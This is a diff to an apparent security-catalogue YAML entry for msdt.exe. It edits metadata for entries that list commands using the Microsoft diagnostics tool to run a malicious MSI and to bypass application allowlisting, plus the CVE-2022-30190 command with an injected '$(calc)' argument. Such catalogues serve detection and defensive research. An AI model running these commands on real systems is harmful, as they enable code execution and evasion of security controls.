@@ -1,11 +1,11 @@
 ---
 Name: Msdt.exe
 Description: Microsoft diagnostics tool
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE
-    Description: Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.
+  - Command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
+    Description: Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.
     Usecase: Execute code
     Category: Execute
     Privileges: User
@@ -13,8 +13,9 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Application: GUI
-  - Command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE
-    Description: Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.
+      - Execute: MSI
+  - Command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
+    Description: Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.
     Usecase: Execute code bypass Application whitelisting
     Category: AWL Bypass
     Privileges: User
@@ -22,6 +23,7 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Application: GUI
+      - Execute: MSI
   - Command: msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
     Description: Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.
     Usecase: Execute code bypass Application allowlisting
@@ -31,6 +33,7 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Application: GUI
+      - Execute: CMD
 Full_Path:
   - Path: C:\Windows\System32\Msdt.exe
   - Path: C:\Windows\SysWOW64\Msdt.exe
